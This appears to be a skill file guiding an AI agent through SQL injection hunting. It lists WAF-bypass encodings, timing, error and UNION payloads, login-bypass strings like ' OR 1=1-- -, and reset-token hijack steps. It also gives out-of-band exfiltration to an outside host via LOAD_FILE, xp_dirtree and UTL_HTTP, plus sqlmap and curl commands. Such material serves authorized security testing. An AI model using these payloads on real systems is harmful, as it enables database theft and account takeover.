---
name: sqli
description: >-
  SQL injection hunting — error/boolean/time/UNION/stacked/OOB channels from DB sinks
  to data exfil, auth bypass and RCE. Auto-invoke when: DB error strings (SQLSTATE,
  "You have an error in your SQL syntax", psql/mysql prefixes), `id=`/`sort=`/`order=`
  params, timing tracks injected delays, quote breaks endpoints. Do NOT load for:
  NoSQL `$ne`/JSON operator objects → use `nosqli`.
family: differential
severity: low → critical
---

# SQL Injection — error · blind · UNION · stacked · OOB

> **Arsenal:** read DB, bypass auth, write files/execute commands (DBMS-specific).
> **Sibling:** `nosqli` (JSON/operator objects); ORM kwargs/`__gt` keys → `nosqli`.
> **Proof bar:** stable oracle delta (bool row-set change, ≥3× timing separation ≥2s,
> error echoing extracted data, or DNS/HTTP OOB callback carrying subquery output).
> **Setup:** none beyond a sink — param, header, path segment or stored field that
> reaches a SQL string.

## WAF Bypass (SQL)
- Case: `sElEcT uNiOn` · whitespace: `%0a` `%09` `/**/` `/*!50000*/` (MySQL versioned comments)
- Encoding: hex `0x27`, `%bf%27` charset tricks, double-URL `%25%33%63` (WAF decodes once, app twice)
- HPP: `?id=1&id='` (PHP last-wins vs WAF first) · chunked bodies · unicode homoglyphs (MSSQL `nvarchar`)
- Stacked-equivalent via `;` only where supported (MSSQL/PG); comments to trim: `-- -` `#` `/*`
- Edge casts (MSSQL): `nvarchar` vs `varchar` conversion errors as oracle; SQLi in `ORDER BY` via `CASE WHEN`

## Context
- Sink exists when user input is concatenated into SQL — classic in legacy PHP/ASP, search, filters,
  sort keys, CSV export, login SQL, token-reset queries, header-logged analytics (User-Agent/Referer).
- A quote that ERRORS is a break, not injection; repair (`'` + benign twin) must return to baseline first.
- Each sink validates separately — param, header, path, stored field are separate ledger items.

## General Techniques
- **Break-then-repair:** `id=1'` vs `id=1` — delta = sink exists; then find the oracle
- **Boolean:** `AND 1=1` / `AND 1=2` (context-appropriate quote) — consistent row-set change
- **Timing:** `SLEEP(3)` MySQL · `WAITFOR DELAY '0:0:3'` MSSQL · `pg_sleep(3)` PG · `DBMS_LOCK.SLEEP(3)` Oracle — ×3 repeats
- **Error-based:** MySQL `extractvalue(1,concat(0x7e,(SELECT …)))` · MSSQL `CONVERT(int,…)` · PG `CAST(… AS int)` · Oracle `ctxsys.drithsx.sn(1,(SELECT …))`
- **UNION:** `ORDER BY N` column count → NULL-pad UNION → marker cell render
- **OOB (no in-band):** MySQL `LOAD_FILE('\\\\host\\x')` / `INTO OUTFILE` · MSSQL `xp_dirtree '\\host'` (NTLM) · PG `COPY … TO '\\\\host'` · Oracle `UTL_HTTP.request(…data…)`
- **Header-sink:** marker + quote in User-Agent/Referer/XFF → stored & queried → error/timing oracle
- **Path-segment sink:** quote directly in path segment; repair rule applies
- **ORDER-BY / identifier sink:** conditional-ordering `CASE WHEN … THEN 1 ELSE 2 END` differential; `(SELECT version())` as column expression
- **Insert-statement:** VALUES breakout with subquery in middle value → visible via app read-back
- **AST-filter injection:** poison predicate node in filter-to-SQL converters → extra rows / error-with-SQL-text
- **Second-order:** store `' OR 1=1-- -` in username/profile → fires at later export/admin view

## Second-Order & Bypass Techniques
- Store payload in profile/username → trigger at sort/export/admin render (oracle at the SECOND query)
- WAF-normalized `UNION` → rebuild with `/**/` + hex concat until identical observable returns

## Auth Bypass Techniques
- Login: `' OR 1=1-- -` / `' UNION SELECT …` on username/password fields
- Reset-token query: inject into the token SELECT → replay/reset victim
- Session-derivation query: control the string that derives the session id

## Header Techniques
- User-Agent / Referer / X-Forwarded-For / Accept-Language stored-then-queried headers
- `X-Forwarded-For` logging fields echoed in admin analytics views

## CVE on Sight
| CVE | Surface | Class |
|---|---|---|
| (no signature CVEs — DBMS-version dependent; banner → search CVE for MySQL/PG/MSSQL version) | version string | version-specific |

## Indicators — record as `possible` when seen
- `SQLSTATE` / `syntax error` / `Unclosed quotation mark` / `ERROR: syntax error at or near` / `ORA-` in body
- `404/500` ONLY when input contains a quote; response length shifts with `1=1` vs `1=2`
- Timing tracks `SLEEP(3)` on any input; `ORDER BY N` fails only above true N
- Parameter reflected into a query string in network logs / analytics panels

## Tools
- `sqlmap -u URL --batch --level 3 --risk 2` (verify oracle by hand first)
- `curl -s -b COOKIE 'URL?id=1%27' -o arm1 -w '%{http_code}'` ; compare `arm1` vs baseline
- Timing: `for i in 1 2 3; do time curl -s ... ; done` ×3 each arm